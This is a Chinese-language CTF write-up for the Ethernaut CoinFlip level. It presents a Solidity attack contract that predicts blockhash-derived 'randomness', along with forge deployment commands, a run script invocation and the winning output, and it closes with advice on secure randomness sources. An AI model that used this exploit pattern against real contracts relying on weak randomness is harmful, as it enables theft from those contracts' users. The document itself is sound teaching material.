# 04 - CoinFlip

## 关卡信息
- **难度**: ⭐⭐ (简单)
- **目标**: 连续猜对10次抛硬币结果

## 漏洞原理

CoinFlip 合约使用 `blockhash` 生成"随机数"，但区块链上的数据都是公开的：

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
```

**问题**：任何人都可以读取相同的 blockhash 并计算出相同的结果。

## 攻击方法

在攻击合约中使用**完全相同的计算逻辑**：

```solidity
contract CoinFlipAttack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // 使用相同的计算方式
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        // 提交预测
        ICoinFlip(coinFlipAddress).flip(side);
    }
}
```

**核心**：攻击合约和目标合约在**同一个区块**执行，看到的 `blockhash` 相同，所以预测100%准确。

## 攻击步骤

### 1. 部署攻击合约

```bash
forge create src/04-CoinFlip/CoinFlipAttack.sol:CoinFlipAttack \
  --rpc-url $sepolia_rpc \
  --account deployer \
  --broadcast \
  --constructor-args $COINFLIP_ADDRESS
```

### 2. 运行攻击脚本

使用 viem 脚本确保每次攻击在不同区块：

```bash
# 设置环境变量
export ATTACK_ADDRESS=0x...
export COINFLIP_ADDRESS=0x...

# 运行攻击
node script/CoinFlip.js
```

### 3. 结果

```
✅ Confirmed in block: 9382495
Consecutive wins: 10
🎉 Challenge completed!
```

## 安全启示

**永远不要用 blockhash 作为随机数**：
- ✗ 矿工可以预测
- ✗ 攻击者可以在同一交易中计算
- ✗ 完全可被操纵

**正确的随机数方案**：
- ✅ Chainlink VRF
- ✅ Commit-Reveal 模式
- ✅ 链下预言机

## 相关资源

- [SWC-120: Weak Sources of Randomness](https://swcregistry.io/docs/SWC-120)
- [Chainlink VRF](https://docs.chain.link/vrf)

